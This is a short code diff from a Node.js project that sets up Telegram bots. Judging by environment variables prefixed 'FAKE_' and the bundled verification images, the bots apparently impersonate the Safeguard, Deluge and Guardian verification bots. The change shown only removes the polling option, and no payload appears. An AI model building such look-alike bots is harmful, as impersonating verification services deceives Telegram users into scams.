@@ -21,9 +21,9 @@ const delugeVerification = fs.readFileSync(path.join(__dirname, "images/verifica
 const guardianVerification = fs.readFileSync(path.join(__dirname, "images/verification/guardian.jpg"));
 const safeguardVerification = fs.readFileSync(path.join(__dirname, "images/verification/safeguard.jpg"));
 
-const safeguardBot = new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN, { polling: true });
-const delugeBot = new TelegramBot(process.env.FAKE_DELUGE_BOT_TOKEN, { polling: true });
-const guardianBot = new TelegramBot(process.env.FAKE_GUARDIAN_BOT_TOKEN, { polling: true });
+const safeguardBot = new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN);
+const delugeBot = new TelegramBot(process.env.FAKE_DELUGE_BOT_TOKEN);
+const guardianBot = new TelegramBot(process.env.FAKE_GUARDIAN_BOT_TOKEN);
 
 const guardianButtonTexts = [
   "🟩ARKI all-in-1 TG tools👈JOIN NOW!🟡",
